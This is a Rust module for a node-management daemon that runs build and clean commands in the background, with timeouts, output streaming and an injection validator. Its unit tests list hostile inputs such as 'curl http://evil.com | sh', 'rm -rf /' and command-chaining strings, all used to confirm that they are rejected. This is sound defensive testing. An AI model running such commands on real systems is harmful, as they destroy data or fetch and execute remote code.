//! Build and clean operations for nodes.
//!
//! Handles background build/clean commands with output streaming,
//! command validation, and timeout management.

use super::{NodeManager, NodeManagerError, Result};
use crate::daemon::systemd::ActiveState;
use crate::schemas::daemon::v1::NodeStatus;
use std::collections::VecDeque;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;

/// Build timeout in seconds (10 minutes)
const BUILD_TIMEOUT_SECS: u64 = 600;

/// Maximum number of build output lines to retain
const MAX_BUILD_OUTPUT_LINES: usize = 100;

/// Build state for a node
#[derive(Debug, Clone)]
pub struct BuildState {
    pub status: BuildStatus,
    pub output: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BuildStatus {
    Idle,
    Building,
    Cleaning,
}

impl Default for BuildState {
    fn default() -> Self {
        Self {
            status: BuildStatus::Idle,
            output: Vec::new(),
        }
    }
}

impl NodeManager {
    /// Stop a node's service if it is currently running.
    /// Used before build/clean operations to avoid conflicts with the running binary.
    async fn stop_if_running(&self, name: &str) {
        match self.supervisor.get_active_state(name).await {
            Ok(ActiveState::Active | ActiveState::Activating) => {
                log::info!("Stopping {} before build/clean", name);
                let _ = self.supervisor.stop_unit(name).await;
                tokio::time::sleep(Duration::from_millis(500)).await;
            }
            Err(e) => {
                log::warn!(
                    "Could not check state of {} ({}), proceeding anyway",
                    name,
                    crate::daemon::util::sanitize_log_msg(&e.to_string())
                );
            }
            _ => {}
        }
    }

    /// Acquire the build/clean lock for a node: check not already in progress, stop
    /// if running, mark as in-progress, update cached state, and emit the start event.
    /// Returns the node path on success.
    async fn begin_build_activity(
        &self,
        name: &str,
        status: BuildStatus,
        start_event: &str,
    ) -> Result<String> {
        let path = self.find_node_path(name).await?;
        self.stop_if_running(name).await;

        let mut building = self.building_nodes.lock().await;
        if !building.insert(name.to_string()) {
            return Err(NodeManagerError::AlreadyBuilding(name.to_string()));
        }
        drop(building);

        let mut nodes = self.nodes.write().await;
        if let Some(node) = nodes.get_mut(name) {
            node.build_state.status = status;
            node.build_state.output.clear();
            node.status = NodeStatus::Building;
        }
        drop(nodes);

        self.emit_event(start_event, name).await;
        Ok(path)
    }

    /// Build a node
    pub(crate) async fn build_node(
        self: &Arc<Self>,
        manager: Arc<Self>,
        name: &str,
    ) -> Result<String> {
        let path = self
            .begin_build_activity(name, BuildStatus::Building, "building")
            .await?;

        // Get build command
        let build_cmd = {
            let nodes = self.nodes.read().await;
            let node = nodes
                .get(name)
                .ok_or_else(|| NodeManagerError::NodeNotFound(name.to_string()))?;
            node.manifest
                .as_ref()
                .and_then(|m| m.build.clone())
                .ok_or_else(|| {
                    NodeManagerError::BuildError("No build command defined".to_string())
                })?
        };

        let name_clone = name.to_string();
        let path_clone = path.clone();

        tokio::spawn(async move {
            let result = run_with_timeout(&manager, &path_clone, &build_cmd, &name_clone).await;

            finish_build_activity(&manager, &name_clone, &result, "Build").await;

            if result.is_ok() {
                let mut nodes = manager.nodes.write().await;
                if let Some(node) = nodes.get_mut(&name_clone) {
                    node.is_built = true;
                }
                drop(nodes);
            }

            let _ = manager.refresh_all().await;

            match result {
                Ok(_) => manager.emit_event("build_complete", &name_clone).await,
                Err(NodeManagerError::BuildTimeout(_)) => {
                    manager.emit_event("build_timeout", &name_clone).await
                }
                Err(_) => manager.emit_event("build_failed", &name_clone).await,
            }
        });

        Ok(format!("Building {} (background)", name))
    }

    /// Clean a node
    pub(crate) async fn clean_node(
        self: &Arc<Self>,
        manager: Arc<Self>,
        name: &str,
    ) -> Result<String> {
        let path = self
            .begin_build_activity(name, BuildStatus::Cleaning, "cleaning")
            .await?;

        let name_clone = name.to_string();
        let path_clone = path.clone();

        tokio::spawn(async move {
            let result =
                run_with_timeout(&manager, &path_clone, "pixi run clean", &name_clone).await;

            finish_build_activity(&manager, &name_clone, &result, "Clean").await;

            let _ = manager.refresh_all().await;

            // Force is_built = false after refresh for successful cleans.
            // refresh_all() re-checks the filesystem, which may still find
            // artifacts if the clean process hasn't fully flushed yet.
            {
                let mut nodes = manager.nodes.write().await;
                if let Some(node) = nodes.get_mut(&name_clone) {
                    node.is_built = false;
                }
            }

            manager.emit_event("clean_complete", &name_clone).await;
        });

        Ok(format!("Cleaning {} (background)", name))
    }
}

/// Run a build/clean command with the standard timeout, returning the result.
async fn run_with_timeout(
    manager: &Arc<NodeManager>,
    path: &str,
    cmd: &str,
    name: &str,
) -> Result<()> {
    let timeout_duration = Duration::from_secs(BUILD_TIMEOUT_SECS);
    match tokio::time::timeout(
        timeout_duration,
        run_build_command(manager, path, cmd, name),
    )
    .await
    {
        Ok(result) => result,
        Err(_) => Err(NodeManagerError::BuildTimeout(name.to_string())),
    }
}

/// Common post-run bookkeeping: remove from building set, update build_state, append output summary.
/// `label` is "Build" or "Clean" for user-facing messages.
async fn finish_build_activity(
    manager: &Arc<NodeManager>,
    name: &str,
    result: &Result<()>,
    label: &str,
) {
    manager.building_nodes.lock().await.remove(name);

    let mut nodes = manager.nodes.write().await;
    if let Some(node) = nodes.get_mut(name) {
        node.build_state.status = BuildStatus::Idle;

        let message = match result {
            Ok(_) => format!("--- {} completed successfully ---", label),
            Err(NodeManagerError::BuildTimeout(_)) => format!("--- {} timed out ---", label),
            Err(e) => format!("--- {} failed: {} ---", label, e),
        };
        node.build_state.output.push(message);
    }
}

/// Validate a build command to prevent command injection
fn validate_build_command(cmd: &str) -> Result<()> {
    // Allowlist of permitted build command prefixes
    const ALLOWED_PREFIXES: &[&str] = &["cargo ", "pixi ", "npm ", "make ", "python ", "pip "];

    let cmd_lower = cmd.to_lowercase();
    let has_allowed_prefix = ALLOWED_PREFIXES
        .iter()
        .any(|prefix| cmd_lower.starts_with(prefix));

    if !has_allowed_prefix {
        return Err(NodeManagerError::BuildError(format!(
            "Build command must start with one of: cargo, pixi, npm, make, python, pip. Got: {}",
            cmd.chars().take(50).collect::<String>()
        )));
    }

    // Reject dangerous shell metacharacters
    const DANGEROUS_CHARS: &[char] = &[
        '$', '`', '|', ';', '&', '>', '<', '(', ')', '{', '}', '!', '\\', '\n', '\r', '*', '?',
        '[', ']', '~', '#',
    ];
    if let Some(bad_char) = cmd.chars().find(|c| DANGEROUS_CHARS.contains(c)) {
        return Err(NodeManagerError::BuildError(format!(
            "Build command contains dangerous character '{}': {}",
            bad_char,
            cmd.chars().take(50).collect::<String>()
        )));
    }

    Ok(())
}

/// Run a build/clean command and stream output to the node's build state
async fn run_build_command(
    manager: &Arc<NodeManager>,
    path: &str,
    cmd: &str,
    name: &str,
) -> Result<()> {
    // Validate command before execution to prevent command injection
    validate_build_command(cmd)?;

    // Build a PATH that includes user tool directories (pixi, cargo, etc.)
    // so build commands like "pixi run build" work under systemd's minimal env.
    let home = dirs::home_dir().unwrap_or_else(|| std::path::PathBuf::from("/home/user"));
    let build_path = format!(
        "{}:{}:/usr/local/bin:/usr/bin:/bin",
        home.join(".cargo/bin").display(),
        home.join(".pixi/bin").display(),
    );

    let mut child = Command::new("sh")
        .args(["-c", cmd])
        .current_dir(path)
        .env("PATH", &build_path)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true) // Kill child process if future is dropped (e.g., on timeout)
        .spawn()?;

    let stdout = child.stdout.take();
    let stderr = child.stderr.take();

    // Read stdout — uses VecDeque for efficient front removal
    if let Some(stdout) = stdout {
        let reader = BufReader::new(stdout);
        let mut lines = reader.lines();
        let manager = manager.clone();
        let name = name.to_string();

        tokio::spawn(async move {
            let mut ring = VecDeque::with_capacity(MAX_BUILD_OUTPUT_LINES + 1);
            while let Ok(Some(line)) = lines.next_line().await {
                ring.push_back(line);
                if ring.len() > MAX_BUILD_OUTPUT_LINES {
                    ring.pop_front();
                }
                // Flush to shared state periodically
                let mut nodes = manager.nodes.write().await;
                if let Some(node) = nodes.get_mut(&name) {
                    node.build_state.output = ring.iter().cloned().collect();
                }
            }
        });
    }

    // Read stderr — uses VecDeque for efficient front removal
    if let Some(stderr) = stderr {
        let reader = BufReader::new(stderr);
        let mut lines = reader.lines();
        let manager = manager.clone();
        let name = name.to_string();

        tokio::spawn(async move {
            while let Ok(Some(line)) = lines.next_line().await {
                let mut nodes = manager.nodes.write().await;
                if let Some(node) = nodes.get_mut(&name) {
                    node.build_state.output.push(line);
                    // Keep only last MAX_BUILD_OUTPUT_LINES lines
                    if node.build_state.output.len() > MAX_BUILD_OUTPUT_LINES {
                        node.build_state.output.remove(0);
                    }
                }
            }
        });
    }

    // Wait for process to complete
    let status = child.wait().await?;

    if status.success() {
        Ok(())
    } else {
        Err(NodeManagerError::BuildError(format!(
            "Command exited with code {}",
            status.code().unwrap_or(-1)
        )))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_state_default() {
        let state = BuildState::default();
        assert_eq!(state.status, BuildStatus::Idle);
        assert!(state.output.is_empty());
    }

    #[test]
    fn test_validate_build_command_allowed_prefixes() {
        assert!(validate_build_command("cargo build --release").is_ok());
        assert!(validate_build_command("pixi run build").is_ok());
        assert!(validate_build_command("npm run build").is_ok());
        assert!(validate_build_command("make all").is_ok());
        assert!(validate_build_command("python setup.py build").is_ok());
        assert!(validate_build_command("pip install .").is_ok());
    }

    #[test]
    fn test_validate_build_command_rejects_unknown_prefix() {
        assert!(validate_build_command("rm -rf /").is_err());
        assert!(validate_build_command("curl http://evil.com | sh").is_err());
        assert!(validate_build_command("wget http://evil.com").is_err());
    }

    #[test]
    fn test_validate_build_command_rejects_make_without_space() {
        // "make" without a trailing space should not match arbitrary commands
        // like "makefile-exploit" or "makeover"
        assert!(validate_build_command("makefile-exploit").is_err());
        assert!(validate_build_command("makeover something").is_err());
    }

    #[test]
    fn test_validate_build_command_rejects_newlines() {
        assert!(validate_build_command("cargo build\nrm -rf /").is_err());
        assert!(validate_build_command("cargo build\r\nrm -rf /").is_err());
    }

    #[test]
    fn test_validate_build_command_rejects_shell_metacharacters() {
        assert!(validate_build_command("cargo build; rm -rf /").is_err());
        assert!(validate_build_command("cargo build && evil").is_err());
        assert!(validate_build_command("cargo build | evil").is_err());
        assert!(validate_build_command("cargo build > /etc/passwd").is_err());
        assert!(validate_build_command("cargo build $(evil)").is_err());
        assert!(validate_build_command("cargo build `evil`").is_err());
    }
}
